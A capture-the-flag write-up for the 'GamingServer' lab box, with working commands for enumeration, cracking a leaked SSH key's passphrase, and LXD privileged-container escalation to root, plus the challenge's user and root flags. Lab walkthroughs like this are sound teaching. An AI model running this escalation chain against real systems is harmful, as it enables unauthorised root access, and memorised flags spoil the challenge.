# CTF Writeup — GamingServer

**IP:** `10.114.151.133`  
**Difficulty:** Easy  
**Tags:** `web` `ssh` `john` `lxd` `privesc`

---

## Overview

A beginner-friendly box that rewards careful enumeration. The attack path goes through source code disclosure → directory brute-forcing → SSH key cracking → LXD privilege escalation.

---

## Reconnaissance

### Port Scan

```bash
nmap -sV -sC 10.114.151.133
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29
```

Two ports open: SSH and a web server. Start with the web.

---

## Web Enumeration

### Source Code

Opening the site and checking the page source reveals a developer comment:

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

We now have a potential username: **john**.

### Directory Brute-Force

```bash
gobuster dir -u http://10.114.151.133 -w /usr/share/wordlists/dirb/common.txt
```

```
/robots.txt   (Status: 200)
/secret       (Status: 301)
/uploads      (Status: 301)
```

Three interesting paths found.

### /uploads

Go check this one yourself — there's a little surprise waiting 🙂

More importantly, the directory also contains a file called `dict.lst`. At first glance it looks like a password wordlist, but the contents suggest something else — it's a **passphrase** wordlist. Keep that in mind.

### /secret

This directory contains an **SSH private key** (`id_rsa`). Download it:

```bash
wget http://10.114.151.133/secret/id_rsa
```

---

## Cracking the SSH Key Passphrase

The private key is passphrase-protected. First, convert it to a crackable hash:

```bash
ssh2john id_rsa > hash.txt
```

Then use `dict.lst` as the wordlist:

```bash
john hash.txt --wordlist=dict.lst
```

```
letmein          (id_rsa)
1g 0:00:00:00 DONE
```

**Passphrase:** `letmein`

---

## Initial Access

```bash
chmod 600 id_rsa
ssh -i id_rsa john@10.114.151.133
```

User flag:

```
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

---

## Privilege Escalation — LXD

Checking group membership:

```bash
id
```

```
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

John is in the **lxd** group. This means he can create and manage containers — and we can abuse that to mount the host filesystem inside a privileged container, giving us full read access as root.

### On the Attacker Machine

```bash
# Download the Alpine builder
wget https://github.com/saghul/lxd-alpine-builder/archive/master.zip
unzip master.zip
cd lxd-alpine-builder-master

# Build the Alpine image
sudo bash build-alpine

# Upload it to the target
scp -i ~/id_rsa alpine-v*.tar.gz john@10.114.151.133:/tmp/
```

### On the Target

```bash
# Import the image
lxc image import /tmp/alpine-v*.tar.gz --alias alpine

# Create a privileged container and mount the host filesystem
lxc init alpine x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true

# Start and enter the container
lxc start x
lxc exec x /bin/sh
```

We are now root inside the container, with the host's entire filesystem mounted at `/mnt/`.

Root flag:

```
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

---

## Summary

| Step | Technique |
|------|-----------|
| Username discovery | HTML source code comment |
| Directory enumeration | Gobuster |
| Credential gathering | SSH private key + passphrase wordlist |
| Key cracking | `ssh2john` + `john` |
| Privilege escalation | LXD group → privileged container |

**Key lessons:**

- Developer comments in source code are a real attack surface — never leave usernames or hints in production HTML.
- Always check what files are exposed on a web server before moving on.
- `lxd` group membership is effectively root — treat it as such.
